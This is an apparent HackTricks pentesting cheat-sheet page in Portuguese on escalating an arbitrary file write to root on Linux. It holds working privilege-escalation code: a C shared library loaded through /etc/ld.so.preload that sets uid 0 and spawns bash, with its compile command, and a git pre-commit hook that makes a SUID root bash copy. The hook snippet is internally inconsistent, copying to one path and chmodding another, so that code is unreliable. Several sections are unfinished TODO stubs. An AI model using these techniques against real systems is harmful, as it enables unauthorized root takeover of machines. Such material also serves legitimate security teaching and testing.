# Escrita Arbitrária de Arquivo para Root

{% hint style="success" %}
Aprenda e pratique Hacking AWS: [**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)\
Aprenda e pratique Hacking GCP: [**HackTricks Training GCP Red Team Expert (GRTE)**](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte ao HackTricks</summary>

- Verifique os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
- **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live).
- **Compartilhe truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

### /etc/ld.so.preload

Este arquivo se comporta como a variável de ambiente **`LD_PRELOAD`**, mas também funciona em **binários SUID**.\
Se você pode criá-lo ou modificá-lo, basta adicionar um **caminho para uma biblioteca que será carregada** com cada binário executado.

Por exemplo: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Ganchos do Git

[**Ganchos do Git**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) são **scripts** que são **executados** em vários **eventos** em um repositório git, como quando um commit é criado, um merge... Portanto, se um **script ou usuário privilegiado** estiver realizando essas ações com frequência e for possível **escrever na pasta `.git`**, isso pode ser usado para **escalada de privilégios**.

Por exemplo, é possível **gerar um script** em um repositório git em **`.git/hooks`** para que ele seja sempre executado quando um novo commit é criado:

{% code overflow="wrap" %}
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
{% endcode %}

### Arquivos Cron & de Tempo

TODO

### Arquivos de Serviço & Socket

TODO

### binfmt\_misc

O arquivo localizado em `/proc/sys/fs/binfmt_misc` indica qual binário deve executar qual tipo de arquivo. TODO: verificar os requisitos para abusar disso e executar um shell reverso quando um tipo comum de arquivo é aberto.

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Treinamento HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Treinamento HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte ao HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
